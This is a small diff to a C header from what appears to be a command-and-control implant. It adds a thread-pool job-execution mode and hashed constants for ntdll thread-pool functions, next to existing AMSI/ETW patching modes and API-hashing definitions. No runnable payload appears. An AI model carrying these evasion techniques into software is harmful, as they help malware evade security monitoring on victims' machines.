@@ -36,6 +36,10 @@
 #define PROXYLOAD_RTLCREATETIMER   2
 #define PROXYLOAD_RTLQUEUEWORKITEM 3
 
+/* ARC-09: job execution mode — thread-per-job vs NT thread pool */
+#define JOB_EXEC_THREAD     0
+#define JOB_EXEC_THREADPOOL 1
+
 #define AMSIETW_PATCH_NONE   0
 #define AMSIETW_PATCH_HWBP   1
 #define AMSIETW_PATCH_MEMORY 2
@@ -111,6 +115,11 @@
 #define H_FUNC_RTLEXITUSERTHREAD                     0x2f6db5e8
 #define H_FUNC_RTLSUBAUTHORITYSID                    0x90ed208a
 #define H_FUNC_RTLSUBAUTHORITYCOUNTSID               0x4b23c9d3
+
+/* ARC-09: NT thread pool functions (ntdll) */
+#define H_FUNC_TPALLOCWORK                           0x3fc58c37
+#define H_FUNC_TPPOSTWORK                            0x4d915ab2
+#define H_FUNC_TPRELEASEWORK                         0x27a9ff4d
 
 #define H_FUNC_LOADLIBRARYW                          0xb7072ff1
 #define H_FUNC_GETCOMPUTERNAMEEXA                    0xec725c53
